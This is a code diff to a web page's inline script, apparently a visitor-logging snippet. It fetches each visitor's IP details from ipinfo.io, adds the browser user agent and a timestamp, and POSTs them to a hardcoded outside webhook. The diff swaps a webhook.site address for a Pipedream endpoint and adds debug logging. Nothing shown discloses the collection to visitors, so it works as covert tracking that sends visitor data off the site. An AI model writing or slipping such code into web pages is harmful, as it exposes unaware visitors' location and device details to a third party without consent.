@@ -25,7 +25,10 @@
     <script>
         async function sendDataToWebhook() {
             try {
+                // Fetching the user's IP info
                 const ipData = await fetch("https://ipinfo.io/json").then(res => res.json());
+                console.log("IP Data Retrieved:", ipData); // Debugging line
+
                 const userAgent = navigator.userAgent;
                 const log = {
                     ip: ipData.ip,
@@ -35,14 +38,23 @@
                     userAgent,
                     time: new Date().toISOString()
                 };
-
-                const webhookUrl = "https://webhook.site/a75cc371-47c5-4513-aaff-5282696bb856"; // Replace with your unique webhook URL
-                await fetch(webhookUrl, {
+                
+                console.log("Data to Send:", log); // Debugging line
+                
+                // Using your Pipedream webhook URL
+                const webhookUrl = "https://eoky7dsuisvr7mo.m.pipedream.net"; // Replace with your new Pipedream webhook URL
+                const response = await fetch(webhookUrl, {
                     method: "POST",
                     body: JSON.stringify(log),
                     headers: { "Content-Type": "application/json" }
                 });
-
+                
+                // Check if the request was successful
+                if (response.ok) {
+                    console.log("Data successfully sent to the webhook.");
+                } else {
+                    console.error("Error sending data to webhook:", response.status);
+                }
             } catch (e) {
                 console.error("Error sending data:", e);
             }
